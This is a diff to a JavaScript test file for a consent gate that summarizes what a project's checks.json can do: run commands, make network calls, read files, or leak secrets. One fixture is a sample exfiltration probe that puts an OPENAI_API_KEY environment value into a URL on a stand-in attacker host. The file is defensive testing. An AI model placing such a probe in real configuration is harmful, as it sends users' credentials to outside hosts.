@@ -4,7 +4,9 @@ import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { loadChecks, cwdOverrideInfo } from '../src/engine.js';
-import { trustDir, untrustDir, listTrusted, isTrusted, normDir, trustedChecks } from '../src/trust.js';
+import {
+  trustDir, untrustDir, listTrusted, isTrusted, normDir, trustedChecks, summarizeChecks,
+} from '../src/trust.js';
 
 // A cwd/checks.json that runs a command — the exact thing the gate must block.
 const rce = (id) => JSON.stringify({
@@ -133,5 +135,36 @@ test('trustedChecks returns parsed checks only when trusted, and fails closed ot
 test('trustedChecks returns null for a missing checks.json', () => {
   withProject(({ proj }) => {
     assert.equal(trustedChecks(proj), null);
+  });
+});
+
+// summarizeChecks discloses the full capability surface a user authorizes by trusting
+// a file — not just exec/mcp. An http probe that exfiltrates a secret via ${ENV:VAR}
+// must be counted (network + exfil), so the consent prompt cannot report it as harmless.
+test('summarizeChecks counts command / network / file-read / env-exfil capabilities', () => {
+  withProject(({ proj }) => {
+    const file = join(proj, 'checks.json');
+    writeFileSync(file, JSON.stringify({
+      checks: [
+        { id: 'a', probe: { type: 'exec', cmd: 'git' } },
+        { id: 'b', probe: { type: 'mcp', config: '~/.claude.json' } },
+        { id: 'c', probe: { type: 'http', url: 'https://evil.example/?k=${ENV:OPENAI_API_KEY}' } },
+        { id: 'd', probe: { type: 'port', port: 5432 } },
+        { id: 'e', probe: { type: 'fileJson', path: '~/.config/x.json' } },
+        { id: 'f', probe: { type: 'ollamaTags', url: 'http://127.0.0.1:11434' } },
+      ],
+    }));
+    const s = summarizeChecks(file);
+    assert.equal(s.total, 6);
+    assert.equal(s.runCmd, 2, 'exec + mcp spawn a process');
+    assert.equal(s.network, 3, 'http + port + ollamaTags make network calls');
+    assert.equal(s.reads, 1, 'fileJson reads a local file');
+    assert.equal(s.exfil, 1, 'the ${ENV:} http probe hands a secret to its target');
+  });
+});
+
+test('summarizeChecks on a missing/invalid file reports zero, never throws', () => {
+  withProject(({ proj }) => {
+    assert.deepEqual(summarizeChecks(join(proj, 'nope.json')), { total: 0, runCmd: 0, network: 0, reads: 0, exfil: 0 });
   });
 });
